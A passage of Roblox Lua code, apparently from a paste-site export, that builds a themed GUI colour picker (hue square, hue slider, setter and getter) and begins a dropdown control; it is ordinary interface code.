id,title,username,language,date,content
					colorpicker.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.BlackOutline2.MouseEnter:Connect(function()
					colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				colorpicker.BlackOutline2.MouseLeave:Connect(function()
					if not window.OpenedColorPickers[colorpicker.MainPicker] then
						colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end
				end)

				colorpicker.MainPicker = Instance.new(""TextButton"", colorpicker.Main)
				colorpicker.MainPicker.Name = ""picker""
				colorpicker.MainPicker.ZIndex = 100
				colorpicker.MainPicker.Visible = false
				colorpicker.MainPicker.AutoButtonColor = false
				colorpicker.MainPicker.Text = """"
				window.OpenedColorPickers[colorpicker.MainPicker] = false
				colorpicker.MainPicker.Size = UDim2.fromOffset(180, 196)
				colorpicker.MainPicker.BorderSizePixel = 0
				colorpicker.MainPicker.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
				colorpicker.MainPicker.Rotation = 0
				colorpicker.MainPicker.Position = UDim2.fromOffset(- colorpicker.MainPicker.AbsoluteSize.X + colorpicker.Main.AbsoluteSize.X, 15)

				colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.BlackOutline3.Name = ""blackline""
				colorpicker.BlackOutline3.ZIndex = 98
				colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(6, 6)
				colorpicker.BlackOutline3.BorderSizePixel = 0
				colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.Outline2 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.Outline2.Name = ""blackline""
				colorpicker.Outline2.ZIndex = 98
				colorpicker.Outline2.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(4, 4)
				colorpicker.Outline2.BorderSizePixel = 0
				colorpicker.Outline2.BackgroundColor3 = window.theme.outlinecolor
				colorpicker.Outline2.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					colorpicker.Outline2.BackgroundColor3 = theme.outlinecolor
				end)

				colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.BlackOutline3.Name = ""blackline""
				colorpicker.BlackOutline3.ZIndex = 98
				colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(2, 2)
				colorpicker.BlackOutline3.BorderSizePixel = 0
				colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.hue = Instance.new(""ImageLabel"", colorpicker.MainPicker)
				colorpicker.hue.ZIndex = 101
				colorpicker.hue.Position = UDim2.new(0, 3, 0, 3)
				colorpicker.hue.Size = UDim2.new(0, 172, 0, 172)
				colorpicker.hue.Image = ""rbxassetid://4155801252""
				colorpicker.hue.ScaleType = Enum.ScaleType.Stretch
				colorpicker.hue.BackgroundColor3 = Color3.new(1, 0, 0)
				colorpicker.hue.BorderColor3 = window.theme.outlinecolor2
				updateevent.Event:Connect(function(theme)
					colorpicker.hue.BorderColor3 = theme.outlinecolor2
				end)

				colorpicker.hueselectorpointer = Instance.new(""ImageLabel"", colorpicker.MainPicker)
				colorpicker.hueselectorpointer.ZIndex = 101
				colorpicker.hueselectorpointer.BackgroundTransparency = 1
				colorpicker.hueselectorpointer.BorderSizePixel = 0
				colorpicker.hueselectorpointer.Position = UDim2.new(0, 0, 0, 0)
				colorpicker.hueselectorpointer.Size = UDim2.new(0, 7, 0, 7)
				colorpicker.hueselectorpointer.Image = ""rbxassetid://6885856475""

				colorpicker.selector = Instance.new(""TextLabel"", colorpicker.MainPicker)
				colorpicker.selector.ZIndex = 100
				colorpicker.selector.Position = UDim2.new(0, 3, 0, 181)
				colorpicker.selector.Size = UDim2.new(0, 173, 0, 10)
				colorpicker.selector.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				colorpicker.selector.BorderColor3 = window.theme.outlinecolor2
				colorpicker.selector.Text = """"
				updateevent.Event:Connect(function(theme)
					colorpicker.selector.BorderColor3 = theme.outlinecolor2
				end)

				colorpicker.gradient = Instance.new(""UIGradient"", colorpicker.selector)
				colorpicker.gradient.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)), 
					ColorSequenceKeypoint.new(0.17, Color3.new(1, 0, 1)), 
					ColorSequenceKeypoint.new(0.33, Color3.new(0, 0, 1)), 
					ColorSequenceKeypoint.new(0.5, Color3.new(0, 1, 1)), 
					ColorSequenceKeypoint.new(0.67, Color3.new(0, 1, 0)), 
					ColorSequenceKeypoint.new(0.83, Color3.new(1, 1, 0)), 
					ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0))
				})

				colorpicker.pointer = Instance.new(""Frame"", colorpicker.selector)
				colorpicker.pointer.ZIndex = 101
				colorpicker.pointer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
				colorpicker.pointer.Position = UDim2.new(0, 0, 0, 0)
				colorpicker.pointer.Size = UDim2.new(0, 2, 0, 10)
				colorpicker.pointer.BorderColor3 = Color3.fromRGB(255, 255, 255)

				if colorpicker.flag and colorpicker.flag ~= """" then
					library.flags[colorpicker.flag] = colorpicker.default
				end

				function colorpicker:RefreshSelector()
					local pos = math.clamp((mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X, 0, 1)
					colorpicker.color = 1 - pos
					colorpicker.pointer:TweenPosition(UDim2.new(pos, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					colorpicker.hue.BackgroundColor3 = Color3.fromHSV(1 - pos, 1, 1)
				end

				function colorpicker:RefreshHue()
					local x = (mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
					local y = (mouse.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
					colorpicker.hueselectorpointer:TweenPosition(UDim2.new(math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 0.952 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 0, math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 0.885 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
				end

				function colorpicker:Set(value)
					local color = Color3.new(math.clamp(value.r, 0, 1), math.clamp(value.g, 0, 1), math.clamp(value.b, 0, 1))
					colorpicker.value = color

					if colorpicker.flag and colorpicker.flag ~= """" then
						library.flags[colorpicker.flag] = color
					end

					local clr = Color3.new(math.clamp(color.R / 1.7, 0, 1), math.clamp(color.G / 1.7, 0, 1), math.clamp(color.B / 1.7, 0, 1))
					colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color), ColorSequenceKeypoint.new(1, clr)})
					pcall(colorpicker.callback, color)
				end

				function colorpicker:Get()
					return colorpicker.value
				end

				colorpicker:Set(colorpicker.default)

				function colorpicker:AddDropdown(items, default, multichoice, callback, flag)
					local dropdown = {}

					dropdown.defaultitems = items or {}
					dropdown.default = default
					dropdown.callback = callback or function() end
					dropdown.multichoice = multichoice or false
					dropdown.values = {}
					dropdown.flag = flag or ((colorpicker.text or """") .. #sector.Items:GetChildren())

					dropdown.Main = Instance.new(""TextButton"", sector.Items)
					dropdown.Main.Name = ""dropdown""
					dropdown.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.BorderSizePixel = 0
					dropdown.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 16)
					dropdown.Main.Position = UDim2.fromOffset(0, 0)
					dropdown.Main.ZIndex = 5
					dropdown.Main.AutoButtonColor = false
					dropdown.Main.Font = window.theme.font
					dropdown.Main.Text = """"
					dropdown.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.TextSize = 15
					dropdown.Main.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.Main.Font = theme.font
					end)

					dropdown.Gradient = Instance.new(""UIGradient"", dropdown.Main)
					dropdown.Gradient.Rotation = 90
					dropdown.Gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))}

					dropdown.SelectedLabel = Instance.new(""TextLabel"", dropdown.Main)
					dropdown.SelectedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.BackgroundTransparency = 1
					dropdown.SelectedLabel.Position = UDim2.fromOffset(5, 2)
					dropdown.SelectedLabel.Size = UDim2.fromOffset(130, 13)
					dropdown.SelectedLabel.Font = window.theme.font
					dropdown.SelectedLabel.Text = colorpicker.text
					dropdown.SelectedLabel.ZIndex = 5
					dropdown.SelectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.TextSize = 15
					dropdown.SelectedLabel.TextStrokeTransparency = 1
					dropdown.SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.SelectedLabel.Font = theme.font
					end)

					dropdown.Nav = Instance.new(""ImageButton"", dropdown.Main)
					dropdown.Nav.Name = ""navigation""
					dropdown.Nav.BackgroundTransparency = 1
					dropdown.Nav.LayoutOrder = 10
					dropdown.Nav.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 5)
					dropdown.Nav.Rotation = 90
					dropdown.Nav.ZIndex = 5
					dropdown.Nav.Size = UDim2.fromOffset(8, 8)
					dropdown.Nav.Image = ""rbxassetid://4918373417""
					dropdown.Nav.ImageColor3 = Color3.fromRGB(210, 210, 210)

					dropdown.BlackOutline2 = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2.Name = ""blackline""
					dropdown.BlackOutline2.ZIndex = 4
					dropdown.BlackOutline2.Size = dropdown.Main.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2.BorderSizePixel = 0
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.Outline = Instance.new(""Frame"", dropdown.Main)
					dropdown.Outline.Name = ""blackline""
					dropdown.Outline.ZIndex = 4
					dropdown.Outline.Size = dropdown.Main.Size + UDim2.fromOffset(4, 4)
					dropdown.Outline.BorderSizePixel = 0
					dropdown.Outline.BackgroundColor3 = window.theme.outlinecolor
					dropdown.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						dropdown.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutline = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline.Name = ""blackline""
					dropdown.BlackOutline.ZIndex = 4
					dropdown.BlackOutline.Size = dropdown.Main.Size + UDim2.fromOffset(2, 2)
					dropdown.BlackOutline.BorderSizePixel = 0
					dropdown.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.ItemsFrame = Instance.new(""ScrollingFrame"", dropdown.Main)
					dropdown.ItemsFrame.Name = ""itemsframe""
					dropdown.ItemsFrame.BorderSizePixel = 0
					dropdown.ItemsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					dropdown.ItemsFrame.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.ItemsFrame.ScrollBarThickness = 2
					dropdown.ItemsFrame.ZIndex = 8
					dropdown.ItemsFrame.ScrollingDirection = ""Y""
					dropdown.ItemsFrame.Visible = false
					dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.Main.AbsoluteSize.X, 0)

					dropdown.ListLayout = Instance.new(""UIListLayout"", dropdown.ItemsFrame)
					dropdown.ListLayout.FillDirection = Enum.FillDirection.Vertical
					dropdown.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

					dropdown.ListPadding = Instance.new(""UIPadding"", dropdown.ItemsFrame)
					dropdown.ListPadding.PaddingTop = UDim.new(0, 2)
					dropdown.ListPadding.PaddingBottom = UDim.new(0, 2)
					dropdown.ListPadding.PaddingLeft = UDim.new(0, 2)
					dropdown.ListPadding.PaddingRight = UDim.new(0, 2)

					dropdown.BlackOutline2Items = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2Items.Name = ""blackline""
					dropdown.BlackOutline2Items.ZIndex = 7
					dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2Items.BorderSizePixel = 0
					dropdown.BlackOutline2Items.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2Items.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 3, - 3)
					dropdown.BlackOutline2Items.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2Items.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.OutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.OutlineItems.Name = ""blackline""
					dropdown.OutlineItems.ZIndex = 7
					dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
					dropdown.OutlineItems.BorderSizePixel = 0
					dropdown.OutlineItems.BackgroundColor3 = window.theme.outlinecolor
					dropdown.OutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 2, - 2)
					dropdown.OutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.OutlineItems.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutlineItems.Name = ""blackline""
					dropdown.BlackOutlineItems.ZIndex = 7
					dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(- 2, - 2)
					dropdown.BlackOutlineItems.BorderSizePixel = 0
					dropdown.BlackOutlineItems.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 1, - 1)
					dropdown.BlackOutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutlineItems.BackgroundColor3 = theme.outlinecolor2
